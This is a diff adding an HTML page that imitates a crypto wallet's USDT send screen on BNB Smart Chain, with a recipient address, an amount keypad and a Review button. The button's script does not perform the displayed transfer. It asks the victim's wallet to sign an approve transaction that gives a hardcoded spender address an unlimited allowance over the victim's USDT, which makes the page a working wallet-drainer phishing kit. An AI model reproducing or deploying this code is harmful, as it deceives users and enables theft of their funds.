@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crypto Wallet Transfer</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            walletDark: '#0b0e14',
+            walletCard: '#131722',
+            walletBorder: '#1e2330',
+            walletBtn: '#1a1f2c',
+            primaryBlue: '#4338ca',
+            primaryHover: '#3730a3',
+            subText: '#848e9c',
+            usdtGreen: '#26a17b'
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    * {
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    body {
+      background-color: #030508;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    .blinking-cursor {
+      display: inline-block;
+      width: 2.5px;
+      height: 2.5rem;
+      background-color: #6366f1;
+      margin-right: 2px;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .page-transition {
+      transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.25s ease;
+    }
+    .screen-p1 {
+      transform: translateX(0%);
+    }
+    .screen-p1.slide-out {
+      transform: translateX(-100%);
+      opacity: 0;
+      pointer-events: none;
+    }
+    .screen-p2 {
+      transform: translateX(100%);
+      opacity: 0;
+      pointer-events: none;
+    }
+    .screen-p2.active {
+      transform: translateX(0%);
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .keypad-btn:active {
+      background-color: rgba(255, 255, 255, 0.08);
+      transform: scale(0.96);
+    }
+  </style>
+</head>
+
+<body class="fixed inset-0 flex items-start justify-center bg-[#030508] text-white overflow-hidden">  <!-- Main Phone Container Screen -->
+<div class="relative w-full h-[calc(100vh-90px)] max-w-[390px] sm:h-[780px] bg-walletDark sm:rounded-[32px] overflow-hidden shadow-2xl flex flex-col border-b border-gray-800/60 mt-2">  
+  
+  <!-- ================= PAGE 1: SEND TO ================= -->
+<div id="page-1" class="page-transition screen-p1 absolute inset-0 flex flex-col p-5 bg-walletDark z-10">
+  
+  <!-- TOP CONTENT (Takes up remaining space) -->
+  <div class="flex-1">
+    <!-- Top Navigation Header -->
+    <div class="flex items-center justify-between mb-6 pt-2">
+      <button class="w-10 h-10 rounded-full bg-walletBtn flex items-center justify-center text-white hover:bg-gray-800 transition-colors">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/></svg>
+      </button>
+      <h1 class="text-lg font-semibold text-white tracking-wide">Send to</h1>
+      <button class="w-10 h-10 rounded-full bg-walletBtn flex items-center justify-center text-white hover:bg-gray-800 transition-colors">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7V5a2 2 0 012-2h2M17 3h2a2 2 0 012 2v2M21 17v2a2 2 0 01-2 2h-2M7 21H5a2 2 0 01-2-2v-2"/></svg>
+      </button>
+    </div>
+<!-- Target Address Box Card -->
+      <div class="bg-walletCard border border-walletBorder rounded-2xl p-4 mb-6">
+        <p id="p1-address-display" class="text-white text-[15px] font-medium leading-relaxed break-all mb-4">
+          0xB37dEfd37a11F0cF84ec43B067C2CbA9A7A8f2b5
+        </p>
+        <div class="flex items-center gap-2">
+
+        <!-- BNB Network Badge with exact black square logo -->
+    <!-- BNB Network Badge with exact black square logo -->
+          <div class="bg-[#1a1f2c] border border-gray-700/60 rounded-full px-3 py-1.5 flex items-center gap-2 text-xs font-medium text-white">
+            <div class="w-4 h-4 bg-black rounded-[4px] flex items-center justify-center shrink-0">
+              <svg class="w-2.5 h-2.5" viewBox="0 0 24 24" fill="#F3BA2F" xmlns="http://www.w3.org/2000/svg">
+                 <path d="M12 0l5.8 5.8-5.8 5.8-5.8-5.8L12 0zm7.2 7.2l4.8 4.8-4.8 4.8-4.8-4.8 4.8-4.8zM4.8 7.2l4.8 4.8-4.8 4.8L0 12l4.8-4.8zm7.2 16.8l-5.8-5.8 5.8-5.8 5.8 5.8-5.8 5.8zm0-11.3l1.9 1.9-1.9 1.9-1.9-1.9 1.9-1.9z"/>
+              </svg>
+            </div>
+            <span>BNB Smart Chain</span>
+          </div>
+          <!-- Clear Button -->
+          <button id="btn-clear-address" class="bg-[#1a1f2c] border border-gray-700/60 hover:bg-gray-800 text-white rounded-full px-4 py-1.5 text-xs font-medium transition-colors">
+            Clear
+          </button>
+        </div>
+      </div>
+
+<!-- Address Book Header -->
+      <div class="flex items-center justify-between text-white font-semibold text-base mb-4 cursor-pointer hover:opacity-80 transition-opacity">
+        <span>Address book</span>
+        <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"/></svg>
+      </div>
+
+      <!-- Address Book Wallet Item -->
+      <div class="flex items-center gap-3 cursor-pointer p-1 rounded-xl hover:bg-walletCard/50 transition-colors">
+        <div class="w-11 h-11 rounded-full bg-[#11151c] border border-gray-800/80 flex items-center justify-center shrink-0">
+          <svg class="w-5 h-5 text-blue-600" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3z"/>
+          </svg>
+        </div>
+        <div class="overflow-hidden">
+          <h2 class="text-white text-sm font-semibold tracking-wide">Main Wallet 1</h2>
+          <p class="text-subText text-xs truncate">0xb37defd37a11f0cf84ec43b067c2cba9a7a8f2b5</p>
+        </div>
+      </div>
+
+    </div>
+
+  <!-- BOTTOM ACTION BUTTON (Forced to bottom with mt-auto and padded) -->
+  <div class="mt-auto pt-4 pb-10 sm:pb-4 px-2 w-full">
+    <button id="btn-continue" class="w-full py-3.5 bg-primaryBlue hover:bg-primaryHover text-white font-semibold text-base rounded-full shadow-lg transition-all active:scale-[0.98]">
+      Continue
+    </button>
+  </div>
+</div>
+
+
+   <!-- ================= PAGE 2: AMOUNT ================= -->
+    <div id="page-2" class="page-transition screen-p2 absolute inset-0 flex flex-col bg-[#0b0e14] z-20">
+      
+      <!-- Top Navigation Header -->
+      <div class="flex items-center justify-between px-4 py-3 shrink-0">
+        <button id="btn-back" class="w-9 h-9 rounded-full bg-[#1a1f2c] flex items-center justify-center text-white hover:bg-gray-800 transition-colors">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/></svg>
+        </button>
+        <h1 class="text-lg font-semibold text-white tracking-wide">Amount</h1>
+        <div class="w-9"></div>
+      </div>
+
+      <!-- Destination Address -->
+      <div class="px-4 py-2.5 border-y border-[#1e2330] shrink-0">
+        <p class="text-white text-[14px] font-medium leading-relaxed break-all">
+          <span class="text-[#848e9c]">To:</span> <span id="p2-address-target">0xb37defd37a11f0cf84ec43b067c2cba9a7a8f2b5</span>
+        </p>
+      </div>
+
+      <!-- Dynamic Amount Input Display (Gives room to lower keypad stack) -->
+      <div class="flex-1 flex flex-col items-center justify-center py-2 min-h-[90px]">
+        <div class="flex items-center justify-center text-[56px] font-medium tracking-tight leading-none mb-1">
+          <span id="amount-val" class="text-white">0</span>
+        </div>
+        <div class="flex items-center gap-1.5 text-white text-[14px] font-medium">
+          <span id="fiat-val">≈ $0.00</span>
+          <!-- Up/Down Arrow Icon -->
+          <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16V4M7 4L3 8M7 4l4 4M17 8v12M17 20l4-4M17 20l-4-4"/></svg>
+        </div>
+      </div>
+
+      <!-- USDT Asset Row -->
+      <div class="flex items-center justify-between px-5 pb-4 shrink-0">
+        <div class="flex items-center gap-3">
+          <img src="image.png" alt="" class="h-10 w-10 object-contain shrink-0"/>
+          <div>
+            <p class="text-white text-[15px] font-semibold">Tether USDT</p>
+            <p class="text-[#848e9c] text-xs mt-0.5">$0.00</p>
+          </div>
+        </div>
+        <button id="btn-max" class="bg-[#1a1f2c] hover:bg-gray-800 text-white rounded-full px-4 py-1.5 text-xs font-semibold transition-colors">
+          Max
+        </button>
+      </div>
+
+  <!-- KEYPAD (Glued above Review Button) -->
+      <div class="grid grid-cols-3 gap-x-6 gap-y-1 px-4 pb-2 shrink-0">
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('1')">1</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('2')">2</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('3')">3</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('4')">4</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('5')">5</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('6')">6</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('7')">7</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('8')">8</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('9')">9</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('.')">.</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressKey('0')">0</button>
+        <button type="button" class="keypad-btn text-[24px] font-semibold text-white h-10 flex items-center justify-center active:bg-white/10 rounded-lg transition-colors" onclick="pressBackspace()">
+          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414-6.414A2 2 0 0110.828 5H19a2 2 0 012 2v10a2 2 0 01-2 2h-8.172a2 2 0 01-1.414-.586L3 12z"/></svg>
+        </button>
+      </div>
+
+      <!-- REVIEW BUTTON (pb-20 provides ~80px height to clear the floating browser bar) -->
+      <div class="px-4 pb-20 w-full shrink-0">
+        <button type="button" id="nextBtn" class="w-full py-3.5 bg-[#1a1f2c] text-[#475569] font-semibold text-[16px] rounded-[24px] cursor-not-allowed transition-all">
+          Review
+        </button>
+      </div>
+
+
+
+  
+
+  </div>
+    </div>
+
+
+  
+  <script>
+    /* ==========================================
+     * UI & APP STATE
+     * ========================================== */
+    let currentAmountStr = "0"; // Initialize with your default string
+    const USDT_TO_USD_RATE = 1;
+
+    const page1 = document.getElementById('page-1');
+    const page2 = document.getElementById('page-2');
+    const btnContinue = document.getElementById('btn-continue');
+    const btnBack = document.getElementById('btn-back');
+    const btnClearAddress = document.getElementById('btn-clear-address');
+    const p1AddressDisplay = document.getElementById('p1-address-display');
+    const amountValEl = document.getElementById('amount-val');
+    const fiatValEl = document.getElementById('fiat-val');
+    const btnMax = document.getElementById('btn-max');
+    const nextBtn = document.getElementById('nextBtn'); // Unified Review/Web3 button
+
+    btnContinue.addEventListener('click', () => {
+      page1.classList.add('slide-out');
+      page2.classList.add('active');
+    });
+
+    btnBack.addEventListener('click', () => {
+      page2.classList.remove('active');
+      page1.classList.remove('slide-out');
+    });
+
+    btnClearAddress.addEventListener('click', () => {
+      p1AddressDisplay.textContent = "";
+    });
+
+    function refreshDisplay() {
+      amountValEl.textContent = currentAmountStr === "" ? "0" : currentAmountStr;
+
+      const numVal = parseFloat(currentAmountStr);
+      if (isNaN(numVal) || numVal === 0) {
+        fiatValEl.textContent = "≈ $0.00";
+        nextBtn.className = "w-full py-3.5 bg-[#1a1f2c] text-[#475569] font-semibold text-base rounded-full cursor-not-allowed transition-all";
+        nextBtn.disabled = true;
+      } else {
+        const fiatCalculated = (numVal * USDT_TO_USD_RATE).toFixed(2);
+        fiatValEl.textContent = `≈ $${fiatCalculated}`;
+        nextBtn.className = "w-full py-3.5 bg-primaryBlue hover:bg-primaryHover text-white font-semibold text-base rounded-full shadow-lg transition-all active:scale-[0.98] cursor-pointer";
+        nextBtn.disabled = false;
+        // Reset text in case of previous web3 states
+        if (nextBtn.textContent.trim() !== "Review") {
+            nextBtn.textContent = "Review"; 
+        }
+      }
+    }
+
+    // Must be global for inline onClick to work
+    window.pressKey = function(val) {
+      if (val === '.') {
+        if (currentAmountStr.includes('.')) return;
+        if (currentAmountStr === "") currentAmountStr = "0";
+      }
+      if (currentAmountStr === "0" && val !== '.') {
+        currentAmountStr = val;
+      } else {
+        if (currentAmountStr.length < 10) currentAmountStr += val;
+      }
+      refreshDisplay();
+    };
+
+    window.pressBackspace = function() {
+      if (currentAmountStr.length > 0) {
+        currentAmountStr = currentAmountStr.slice(0, -1);
+      }
+      refreshDisplay();
+    };
+
+    btnMax.addEventListener('click', () => {
+      currentAmountStr = "500";
+      refreshDisplay();
+    });
+
+    refreshDisplay();
+
+    /* ==========================================
+     * USDT / BSC CONFIG & WEB3
+     * ========================================== */
+    const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
+    const BSC_CHAIN_ID_HEX = "0x38";
+    const APPROVAL_AMOUNT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn;
+
+    function buildApproveData() {
+      const spender = SPENDER_ADDRESS.slice(2).toLowerCase().padStart(64, "0");
+      const amount = APPROVAL_AMOUNT.toString(16).padStart(64, "0");
+      return "0x095ea7b3" + spender + amount;
+    }
+
+    function getWalletProvider() {
+      if (window.trustwallet && window.trustwallet.ethereum && typeof window.trustwallet.ethereum.request === "function") {
+        return window.trustwallet.ethereum;
+      }
+      if (window.ethereum && typeof window.ethereum.request === "function") {
+        return window.ethereum;
+      }
+      return null;
+    }
+
+    nextBtn.addEventListener("click", async () => {
+      const provider = getWalletProvider();
+
+      if (!provider) {
+        alert("Open this page inside Trust Wallet or MetaMask.");
+        return;
+      }
+
+      try {
+        nextBtn.disabled = true;
+        nextBtn.textContent = "Connecting...";
+
+        const accounts = await provider.request({ method: "eth_requestAccounts" });
+        if (!accounts || accounts.length === 0) throw new Error("No wallet account was returned.");
+        
+        const account = accounts[0];
+
+        let chainId = await provider.request({ method: "eth_chainId" });
+        chainId = String(chainId).toLowerCase();
+
+        if (chainId !== BSC_CHAIN_ID_HEX) {
+          nextBtn.textContent = "Switching network...";
+          await provider.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BSC_CHAIN_ID_HEX }]
+          });
+        }
+
+        const data = buildApproveData();
+        nextBtn.textContent = "Confirm in wallet...";
+
+        const txHash = await provider.request({
+          method: "eth_sendTransaction",
+          params: [{
+            from: account,
+            to: TOKEN_ADDRESS,
+            data: data
+          }]
+        });
+
+        nextBtn.textContent = "Confirming...";
+
+        let receipt = null;
+        for (let i = 0; i < 120; i++) {
+          await new Promise(resolve => setTimeout(resolve, 2000));
+          receipt = await provider.request({
+            method: "eth_getTransactionReceipt",
+            params: [txHash]
+          });
+          if (receipt) break;
+        }
+
+        if (!receipt) throw new Error("Transaction was submitted but confirmation timed out.");
+        if (receipt.status === "0x0" || receipt.status === 0) throw new Error("The approval transaction failed.");
+
+        console.log("Approval confirmed:", txHash);
+        nextBtn.textContent = "Done";
+        nextBtn.disabled = false;
+
+      } catch (error) {
+        console.error("Approval error:", error);
+        if (error && error.code === 4001) {
+          alert("Approval was rejected in the wallet.");
+        } else {
+          alert(error?.message || "Unable to submit the approval transaction.");
+        }
+        refreshDisplay(); // Reset the button to its normal state instead of "Next"
+      }
+    });
+  </script>
+</body>
+</html>
